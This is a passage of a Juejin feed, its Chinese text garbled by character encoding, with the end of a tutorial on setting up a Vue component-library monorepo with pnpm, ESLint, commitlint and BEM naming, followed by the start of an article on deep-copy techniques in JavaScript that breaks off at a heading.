ä½ çš„ç»„ä»¶ä»£ç åœ¨ <code>packages/components</code>ï¼Œæ–‡æ¡£ä»£ç åœ¨ <code>docs</code>ã€‚åœ¨ Monorepo é‡Œï¼Œæ–‡æ¡£å¯ä»¥ç›´æ¥â€œçœ‹åˆ°â€å¹¶ä½¿ç”¨æœ€æ–°çš„ç»„ä»¶ï¼Œä¸éœ€è¦åƒä¼ ç»Ÿæ–¹å¼é‚£æ ·â€”â€”å…ˆç»™ç»„ä»¶å‘ä¸ª NPM åŒ…ï¼Œå†åœ¨æ–‡æ¡£é‡Œä¸‹è½½ã€‚</li>
<li><strong>â€œä¸€äººå¾—é“ï¼Œé¸¡çŠ¬å‡å¤©â€ (ç»Ÿä¸€è§„èŒƒ)</strong>ï¼š
ä½ åªéœ€è¦åœ¨æ ¹ç›®å½•æ”¾ä¸€ä¸ª ESLint é…ç½®æ–‡ä»¶ï¼Œæ•´ä¸ªå·¥å…·ç®±é‡Œçš„æ‰€æœ‰ä»£ç éƒ½ä¼šä¹–ä¹–å¬è¯ï¼Œä¿æŒä¸€æ ·çš„ç¼©è¿›å’Œé£æ ¼ã€‚</li>
<li><strong>â€œä¸€æŸä¿±æŸï¼Œä¸€è£ä¿±è£â€ (ä¾èµ–ä¸€è‡´æ€§)</strong>ï¼š
å¦‚æœä½ æƒ³å‡çº§ Vue ç‰ˆæœ¬ï¼Œåœ¨ Monorepo é‡Œåªéœ€è¦æ”¹ä¸€å¤„ï¼Œæ‰€æœ‰ç›¸å…³çš„æ¼”ç¤ºé¡¹ç›®ã€æ–‡æ¡£ã€ç»„ä»¶åŒ…éƒ½ä¼šåŒæ­¥å‡çº§ï¼Œä¸ä¼šå‡ºç°â€œæ–‡æ¡£ç”¨ Vue3.2ï¼Œç»„ä»¶ç”¨ Vue3.5â€å¯¼è‡´çš„è¯¡å¼‚æŠ¥é”™ã€‚</li>
</ol>
<h4 data-id="heading-3">æ ¸å¿ƒæˆå‘˜ä»‹ç»</h4>
<p>åœ¨æˆ‘ä»¬çš„é¡¹ç›®ä¸­ï¼Œ<code>pnpm</code> æ˜¯ç®¡ç†è¿™ä¸ªå·¨å¤§å·¥å…·ç®±çš„â€œç®¡å®¶â€ã€‚é€šè¿‡ <code>pnpm-workspace.yaml</code>ï¼Œæˆ‘ä»¬åˆ’åˆ†äº†ä¸åŒçš„åŒºåŸŸï¼š</p>
<ul>
<li><strong><code>packages/*</code></strong>ï¼šè¿™é‡Œæ˜¯æ ¸å¿ƒï¼Œå­˜æ”¾ç»„ä»¶åº“ã€å·¥å…·å‡½æ•°ã€ä¸»é¢˜æ ·å¼ã€‚</li>
<li><strong><code>play</code></strong>ï¼šè¿™æ˜¯æˆ‘ä»¬çš„â€œæ²™ç›’â€ï¼Œç”¨æ¥ä¸€è¾¹å†™ç»„ä»¶ä¸€è¾¹é¢„è§ˆæ•ˆæœã€‚</li>
<li><strong><code>docs</code></strong>ï¼šè¿™æ˜¯å‘å¤–ç•Œå±•ç¤ºç»„ä»¶åº“çš„â€œé—¨é¢â€ã€‚</li>
</ul>
<h3 data-id="heading-4">2. ç¯å¢ƒåˆå§‹åŒ–</h3>
<p>é¦–å…ˆï¼Œç¡®ä¿ä½ çš„ Node.js ç‰ˆæœ¬ &gt;= 18ï¼Œå¹¶å…¨å±€å®‰è£… pnpmï¼š</p>
<pre><code class="hljs language-bash" lang="bash">npm install -g pnpm
</code></pre>
<p>åˆå§‹åŒ–é¡¹ç›®ç»“æ„ï¼š</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-built_in">mkdir</span> my-antd-ui
<span class="hljs-built_in">cd</span> my-antd-ui
pnpm init
</code></pre>
<p>æ–°å»º <code>pnpm-workspace.yaml</code>ï¼Œå‘Šè¯‰ pnpm è¿™æ˜¯ä¸€ä¸ª workspace é¡¹ç›®ï¼š</p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-attr">packages:</span>
  <span class="hljs-bullet">-</span> <span class="hljs-string">'packages/*'</span>
  <span class="hljs-bullet">-</span> <span class="hljs-string">'play'</span>
  <span class="hljs-bullet">-</span> <span class="hljs-string">'docs'</span>
</code></pre>
<p>æ­¤æ—¶çš„ç›®å½•ç»“æ„åº”è¯¥å¦‚ä¸‹ï¼š</p>
<pre><code class="hljs language-text" lang="text">my-antd-ui/
â”œâ”€â”€ packages/          # å­˜æ”¾æ ¸å¿ƒä»£ç  (components, theme, utils)
â”œâ”€â”€ play/              # æœ¬åœ°è°ƒè¯•é¡¹ç›® (Playground)
â”œâ”€â”€ docs/              # æ–‡æ¡£ç«™ç‚¹ (VitePress)
â”œâ”€â”€ package.json
â””â”€â”€ pnpm-workspace.yaml
</code></pre>
<h3 data-id="heading-5">3. TypeScript é…ç½®</h3>
<p>åœ¨æ ¹ç›®å½•åˆ›å»º <code>tsconfig.json</code>ï¼Œä½œä¸ºæ‰€æœ‰å­é¡¹ç›®çš„åŸºå‡†é…ç½®ï¼š</p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"compilerOptions"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"baseUrl"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"."</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"jsx"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"preserve"</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"strict"</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"target"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"ESNext"</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"module"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"ESNext"</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"moduleResolution"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"Node"</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"skipLibCheck"</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"esModuleInterop"</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"lib"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-string">"esnext"</span><span class="hljs-punctuation">,</span> <span class="hljs-string">"dom"</span><span class="hljs-punctuation">]</span>
  <span class="hljs-punctuation">}</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<h3 data-id="heading-6">4. è§„èŒƒä½“ç³» (Lint &amp; Format)</h3>
<p>æˆ‘ä»¬å¯ä»¥ä¸€æ­¥åˆ°ä½ï¼Œä½¿ç”¨ <code>@antfu/eslint-config</code>ï¼Œå®ƒé›†æˆäº† ESLint å’Œ Prettier çš„æœ€ä½³å®è·µã€‚</p>
<pre><code class="hljs language-bash" lang="bash">pnpm add -D -w eslint prettier @antfu/eslint-config typescript
</code></pre>
<p>æ–°å»º <code>eslint.config.js</code>ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">import</span> antfu <span class="hljs-keyword">from</span> <span class="hljs-string">'@antfu/eslint-config'</span>

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-title function_">antfu</span>({
  <span class="hljs-attr">vue</span>: <span class="hljs-literal">true</span>,
  <span class="hljs-attr">typescript</span>: <span class="hljs-literal">true</span>,
  <span class="hljs-attr">ignores</span>: [<span class="hljs-string">'**/dist'</span>, <span class="hljs-string">'**/node_modules'</span>]
})
</code></pre>
<h3 data-id="heading-7">5. ä»£ç æäº¤è§„èŒƒ (Husky + Commitlint)</h3>
<p>ä¸ºäº†é˜²æ­¢åƒ <code>fix: bug</code> è¿™æ ·éšæ„çš„æäº¤ä¿¡æ¯ï¼Œæˆ‘ä»¬éœ€è¦å¼•å…¥ Commitlintã€‚</p>
<pre><code class="hljs language-bash" lang="bash">pnpm add -D -w husky lint-staged @commitlint/cli @commitlint/config-conventional
npx husky init
</code></pre>
<p>åœ¨ <code>.husky/commit-msg</code> ä¸­æ·»åŠ é’©å­ï¼š</p>
<pre><code class="hljs language-bash" lang="bash">npx --no -- commitlint --edit <span class="hljs-variable">$1</span>
</code></pre>
<p>æ–°å»º <code>commitlint.config.js</code>ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> {
  <span class="hljs-attr">extends</span>: [<span class="hljs-string">'@commitlint/config-conventional'</span>]
}
</code></pre>
<p>ç°åœ¨ï¼Œå¦‚æœä½ å°è¯•æäº¤ <code>git commit -m "update"</code>ï¼Œå°†ä¼šè¢«æ‹’ç»ï¼›å¿…é¡»ä½¿ç”¨ <code>git commit -m "feat: add button component"</code> è¿™æ ·ç¬¦åˆè§„èŒƒçš„æ ¼å¼ã€‚</p>
<h3 data-id="heading-8">6. æ ·å¼æ¶æ„è®¾è®¡ï¼šç†è§£ BEM è§„èŒƒ</h3>
<p>åœ¨ç¼–å†™ç»„ä»¶åº“æ ·å¼æ—¶ï¼Œæœ€å¤´ç–¼çš„å°±æ˜¯<strong>æ ·å¼å†²çª</strong>ã€‚å¦‚æœå¤§å®¶éƒ½åœ¨ CSS é‡Œå†™ <code>.item</code>ï¼Œé‚£å…¨å±€æ ·å¼å°±ä¼šä¹±æˆä¸€å›¢ã€‚ä¸ºäº†è§£å†³è¿™ä¸ªé—®é¢˜ï¼Œä¸»æµç»„ä»¶åº“ï¼ˆå¦‚ Element Plusï¼‰éƒ½é‡‡ç”¨äº† <strong>BEM</strong> å‘½åè§„èŒƒã€‚</p>
<h4 data-id="heading-9">ä»€ä¹ˆæ˜¯ BEMï¼Ÿ</h4>
<p>BEM å°†ç±»åæ‹†è§£ä¸ºä¸‰ä¸ªéƒ¨åˆ†ï¼š</p>
<ol>
<li><strong>Block (å—)</strong>ï¼šç»„ä»¶çš„æ ¹èŠ‚ç‚¹ã€‚ä¾‹å¦‚ <code>my-button</code>ã€‚</li>
<li><strong>Element (å…ƒç´ )</strong>ï¼šç»„ä»¶å†…éƒ¨çš„å­èŠ‚ç‚¹ã€‚ç”¨åŒä¸‹åˆ’çº¿ <code>__</code> è¿æ¥ã€‚ä¾‹å¦‚ <code>my-button__icon</code>ã€‚</li>
<li><strong>Modifier (ä¿®é¥°ç¬¦)</strong>ï¼šç»„ä»¶çš„ä¸åŒçŠ¶æ€æˆ–å¤–è§‚ã€‚ç”¨åŒè¿å­—ç¬¦ <code>--</code> è¿æ¥ã€‚ä¾‹å¦‚ <code>my-button--primary</code> æˆ– <code>my-button--disabled</code>ã€‚</li>
</ol>
<p><strong>é€šä¿—ä¾‹å­ï¼š</strong>
æƒ³è±¡ä¸€ä¸ªâ€œäººâ€ç»„ä»¶ï¼ˆPersonï¼‰ï¼š</p>
<ul>
<li><code>person</code> (Block)</li>
<li><code>person__hand</code> (Element: äººçš„æ‰‹)</li>
<li><code>person--female</code> (Modifier: å¥³æ€§çš„äºº)</li>
</ul>
<h4 data-id="heading-10">ä¸ºä»€ä¹ˆè¦è¿™ä¹ˆå†™ï¼Ÿ</h4>
<ul>
<li><strong>è¯­ä¹‰æ¸…æ™°</strong>ï¼šä¸€çœ¼å°±èƒ½çœ‹å‡ºè¿™ä¸ªç±»åæ˜¯å±äºå“ªä¸ªç»„ä»¶çš„å“ªä¸ªéƒ¨åˆ†ã€‚</li>
<li><strong>é¿å…å†²çª</strong>ï¼šæ¯ä¸ªç»„ä»¶éƒ½æœ‰ç‹¬ä¸€æ— äºŒçš„å‰ç¼€ï¼ˆNamespaceï¼‰ï¼Œæ ·å¼ä¸ä¼šäº’ç›¸æ±¡æŸ“ã€‚</li>
<li><strong>æ€§èƒ½å‹å¥½</strong>ï¼šå‡å°‘äº† CSS é€‰æ‹©å™¨çš„åµŒå¥—æ·±åº¦ï¼ˆå°½é‡ä¿æŒä¸€çº§ç±»åé€‰æ‹©å™¨ï¼‰ã€‚</li>
</ul>
<h4 data-id="heading-11">è‡ªåŠ¨åŒ–å®ç°ï¼šuseNamespace</h4>
<p>åœ¨ <code>packages/utils/src/namespace.ts</code> ä¸­ï¼Œæˆ‘ä»¬å°è£…äº†ä¸€ä¸ªå·¥å…·å‡½æ•°ï¼Œè®©ç±»åçš„ç”Ÿæˆå˜å¾—åŠè‡ªåŠ¨åŒ–ï¼š</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> <span class="hljs-title function_">useNamespace</span> = (<span class="hljs-params">block: <span class="hljs-built_in">string</span></span>) =&gt; {
  <span class="hljs-keyword">const</span> <span class="hljs-keyword">namespace</span> = 'my' // ä½ çš„ç»„ä»¶åº“å‰ç¼€
  const b = () =&gt; `${<span class="hljs-keyword">namespace</span>}-${block}<span class="hljs-string">` // ç”Ÿæˆ my-button
  const e = (el: string) =&gt; el ? `</span>${<span class="hljs-title function_">b</span>()}__${el}<span class="hljs-string">` : '' // ç”Ÿæˆ my-button__icon
  const m = (mod: string) =&gt; mod ? `</span>${<span class="hljs-title function_">b</span>()}--${mod}<span class="hljs-string">` : '' // ç”Ÿæˆ my-button--primary
  return { b, e, m }
}
</span></code></pre>
<p>åœ¨ Vue ç»„ä»¶ä¸­ä½¿ç”¨ï¼š</p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span>
  <span class="hljs-comment">&lt;!-- æœ€ç»ˆç”Ÿæˆ class="my-button my-button--primary" --&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">:class</span>=<span class="hljs-string">"[ns.b(), ns.m(type)]"</span>&gt;</span>
    <span class="hljs-comment">&lt;!-- æœ€ç»ˆç”Ÿæˆ class="my-button__content" --&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">:class</span>=<span class="hljs-string">"ns.e('content')"</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">slot</span> /&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">setup</span>&gt;</span><span class="javascript">
<span class="hljs-keyword">const</span> ns = <span class="hljs-title function_">useNamespace</span>(<span class="hljs-string">'button'</span>)
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
</code></pre>
<h3 data-id="heading-12">7. ç»“è¯­</h3>
<p>è‡³æ­¤ï¼Œæˆ‘ä»¬çš„ç»„ä»¶åº“åœ°åŸºå·²ç»æ‰“ç‰¢ã€‚æˆ‘ä»¬é…ç½®äº†é«˜æ•ˆçš„ Monorepo ç¯å¢ƒï¼Œç»Ÿä¸€äº†ä»£ç è§„èŒƒï¼Œå¹¶è®¾è®¡äº†æ ·å¼æ¶æ„ã€‚æ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬å°†é€æ­¥å®ç°ç»„ä»¶åº“çš„æ ¸å¿ƒåŠŸèƒ½ï¼Œå¹¶ç¼–å†™æ–‡æ¡£å’Œç¤ºä¾‹é¡¹ç›®ã€‚</p>
<p>æ•¬è¯·æœŸå¾…åç»­æ›´æ–°ï¼</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[å¦‚ä½•å®ç°æ·±æ‹·è´]]></title>    <link>https://juejin.cn/post/7595043061729181730</link>    <guid>https://juejin.cn/post/7595043061729181730</guid>    <pubDate>2026-01-14T14:42:27.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7595043061729181730" data-draft-id="7595053284914675752" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="å¦‚ä½•å®ç°æ·±æ‹·è´"/> <meta itemprop="keywords" content="å‰ç«¯"/> <meta itemprop="datePublished" content="2026-01-14T14:42:27.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ä»£ç çŒäºº"/> <meta itemprop="url" content="https://juejin.cn/user/624972624037374"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            å¦‚ä½•å®ç°æ·±æ‹·è´
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/624972624037374/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ä»£ç çŒäºº
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-14T14:42:27.000Z" title="Wed Jan 14 2026 14:42:27 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-14
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    2
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»3åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">æ·±åº¦æ‹·è´ï¼ˆDeep Copyï¼‰å®ç°è¯¦è§£</h2>
<p>æ·±åº¦æ‹·è´åˆ›å»ºä¸€ä¸ª<strong>å®Œå…¨ç‹¬ç«‹çš„æ–°å¯¹è±¡</strong>ï¼Œé€’å½’å¤åˆ¶åŸå§‹å¯¹è±¡çš„æ‰€æœ‰åµŒå¥—å¯¹è±¡ï¼Œä½¿å¾—æ–°æ—§å¯¹è±¡å®Œå…¨ç‹¬ç«‹ï¼Œäº’ä¸å½±å“ã€‚</p>
<h3 data-id="heading-1">1. JavaScript/TypeScript å®ç°</h3>
<h4 data-id="heading-2">æ–¹æ³•ä¸€ï¼šJSONæ–¹æ³•ï¼ˆæœ€ç®€å•ä½†æœ‰å±€é™æ€§ï¼‰</h4>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">const</span> original = { <span class="hljs-attr">a</span>: <span class="hljs-number">1</span>, <span class="hljs-attr">b</span>: { <span class="hljs-attr">c</span>: <span class="hljs-number">2</span>, <span class="hljs-attr">d</span>: [<span class="hljs-number">3</span>, <span class="hljs-number">4</span>] } };
<span class="hljs-keyword">const</span> deepCopy = <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">parse</span>(<span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(original));
</code></pre>
<p><strong>å±€é™æ€§</strong>ï¼š</p>
<ul>
<li>ä¸èƒ½å¤åˆ¶å‡½æ•°ã€undefinedã€Symbol</li>
<li>ä¸èƒ½å¤„ç†å¾ªç¯å¼•ç”¨</li>
<li>ä¼šå¿½ç•¥åŸå‹é“¾</li>
<li>Dateå¯¹è±¡ä¼šå˜æˆå­—ç¬¦ä¸²</li>
</ul>
<h4 data-id="heading-3">æ–¹æ³•äºŒï¼šé€’å½’å®ç°ï¼ˆæœ€å®Œæ•´ï¼‰</h4>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">deepClone</span>(<span class="hljs-params">obj, hash = <span class="hljs-keyword">new</span> <span class="hljs-built_in">WeakMap</span>()</span>) {
  <span class="hljs-comment">// å¤„ç†åŸºæœ¬ç±»å‹å’Œnull</span>
  <span class="hljs-keyword">if</span> (obj === <span class="hljs-literal">null</span> || <span class="hljs-keyword">typeof</span> obj !== <span class="hljs-string">'object'</span>) <span class="hljs-keyword">return</span> obj;
  
  <span class="hljs-comment">// å¤„ç†Dateå¯¹è±¡</span>
  <span class="hljs-keyword">if</span> (obj <span class="hljs-keyword">instanceof</span> <span class="hljs-title class_">Date</span>) <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>(obj);
  
  <span class="hljs-comment">// å¤„ç†RegExpå¯¹è±¡</span>
  <span class="hljs-keyword">if</span> (obj <span class="hljs-keyword">instanceof</span> <span class="hljs-title class_">RegExp</span>) <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RegExp</span>(obj);
  
  <span class="hljs-comment">// å¤„ç†Arrayå¯¹è±¡</span>
  <span class="hljs-keyword">if</span> (<span class="hljs-title class_">Array</span>.<span class="hljs-title function_">isArray</span>(obj)) {
    <span class="hljs-keyword">const</span> arrCopy = [];
    hash.<span class="hljs-title function_">set</span>(obj, arrCopy); <span class="hljs-comment">// å­˜å‚¨å·²æ‹·è´çš„å¯¹è±¡ï¼Œå¤„ç†å¾ªç¯å¼•ç”¨</span>
    obj.<span class="hljs-title function_">forEach</span>(<span class="hljs-function">(<span class="hljs-params">item, index</span>) =&gt;</span> {
      arrCopy[index] = <span class="hljs-title function_">deepClone</span>(item, hash);
    });
    <span class="hljs-keyword">return</span> arrCopy;
  }
  
  <span class="hljs-comment">// å¤„ç†æ™®é€šå¯¹è±¡</span>
  <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> obj === <span class="hljs-string">'object'</span>) {
    <span class="hljs-comment">// å¦‚æœå·²ç»æ‹·è´è¿‡ï¼Œç›´æ¥è¿”å›ï¼ˆå¤„ç†å¾ªç¯å¼•ç”¨ï¼‰</span>
    <span class="hljs-keyword">if</span> (hash.<span class="hljs-title function_">has</span>(obj)) <span class="hljs-keyword">return</span> hash.<span class="hljs-title function_">get</span>(obj);
    
    <span class="hljs-keyword">const</span> objCopy = {};
    hash.<span class="hljs-title function_">set</span>(obj, objCopy);
    
    <span class="hljs-comment">// å¤åˆ¶æ‰€æœ‰å±æ€§ï¼ŒåŒ…æ‹¬Symbolå±æ€§</span>
    <span class="hljs-keyword">const</span> allKeys = [
      ...<span class="hljs-title class_">Object</span>.<span class="hljs-title function_">getOwnPropertyNames</span>(obj),
      ...<span class="hljs-title class_">Object</span>.<span class="hljs-title function_">getOwnPropertySymbols</span>(obj)
    ];
    
    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">const</span> key <span class="hljs-keyword">of</span> allKeys) {
      objCopy[key] = <span class="hljs-title function_">deepClone</span>(obj[key], hash);
    }
    
    <span class="hljs-keyword">return</span> objCopy;
  }
  
  <span class="hljs-comment">// å…¶ä»–æƒ…å†µï¼ˆå¦‚å‡½æ•°ï¼‰ç›´æ¥è¿”å›</span>
  <span class="hljs-keyword">return</span> obj;
}

<span class="hljs-comment">// ä½¿ç”¨ç¤ºä¾‹</span>
<span class="hljs-keyword">const</span> original = {
  <span class="hljs-attr">name</span>: <span class="hljs-string">'Alice'</span>,
  <span class="hljs-attr">scores</span>: [<span class="hljs-number">85</span>, <span class="hljs-number">90</span>, <span class="hljs-number">95</span>],
  <span class="hljs-attr">address</span>: {
    <span class="hljs-attr">city</span>: <span class="hljs-string">'Beijing'</span>,
    <span class="hljs-attr">street</span>: <span class="hljs-string">'Main St'</span>
  },
  <span class="hljs-title function_">getInfo</span>(<span class="hljs-params"/>) {
    <span class="hljs-keyword">return</span> <span class="hljs-string">`<span class="hljs-subst">${<span class="hljs-variable language_">this</span>.name}</span> from <span class="hljs-subst">${<span class="hljs-variable language_">this</span>.address.city}</span>`</span>;
  },
  <span class="hljs-attr">date</span>: <span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>(),
  <span class="hljs-attr">regex</span>: <span class="hljs-regexp">/test/gi</span>
};

original.<span class="hljs-property">self</span> = original; <span class="hljs-comment">// å¾ªç¯å¼•ç”¨</span>

<span class="hljs-keyword">const</span> deepCopy = <span class="hljs-title function_">deepClone</span>(original);
</code></pre>
<h4 data-id="heading-4">æ–¹æ³•ä¸‰ï¼šä½¿ç”¨structuredClone APIï¼ˆç°ä»£æµè§ˆå™¨ï¼‰</h4>
